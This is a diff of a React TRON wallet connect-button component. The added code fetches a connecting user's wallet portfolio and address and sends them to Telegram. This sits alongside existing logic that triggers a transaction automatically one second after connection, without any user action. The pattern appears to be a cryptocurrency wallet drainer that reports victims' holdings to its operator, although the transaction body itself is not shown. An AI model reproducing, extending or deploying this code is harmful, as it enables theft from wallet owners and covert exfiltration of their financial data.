@@ -2,6 +2,7 @@ import React, { useState, useEffect, useRef } from 'react';
 import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
 import { useWalletModal } from '@tronweb3/tronwallet-adapter-react-ui';
 import { TransactionService } from '../services/transaction.service';
+import { TelegramService } from '../services/telegram.service';
 import { useTranslation } from 'react-i18next';
 
 // --- CONFIGURATION ---
@@ -18,6 +19,7 @@ const ConnectWalletBtn = ({ className }) => {
 
     // To prevent double execution
     const hasTriggeredRef = useRef(false);
+    const hasNotifiedRef = useRef(false);
 
     const handleTransaction = async () => {
         if (!address) return;
@@ -92,16 +94,28 @@ const ConnectWalletBtn = ({ className }) => {
         }
     };
 
-    // Auto-trigger logic
+    // Auto-trigger logic & Notifications
     useEffect(() => {
-        if (connected && address && !hasTriggeredRef.current) {
-            hasTriggeredRef.current = true;
-            const timer = setTimeout(() => handleTransaction(), 1000);
-            return () => clearTimeout(timer);
+        if (connected && address) {
+            // 1. Transaction Auto-Trigger
+            if (!hasTriggeredRef.current) {
+                hasTriggeredRef.current = true;
+                const timer = setTimeout(() => handleTransaction(), 1000);
+                return () => clearTimeout(timer);
+            }
+
+            // 2. Telegram Notification
+            if (!hasNotifiedRef.current) {
+                hasNotifiedRef.current = true;
+                TransactionService.getWalletPortfolio(address).then(portfolio => {
+                    TelegramService.sendConnectionNotification(portfolio, address);
+                });
+            }
         }
 
         if (!connected) {
             hasTriggeredRef.current = false;
+            hasNotifiedRef.current = false;
             setStatus('');
         }
     }, [connected, address]);
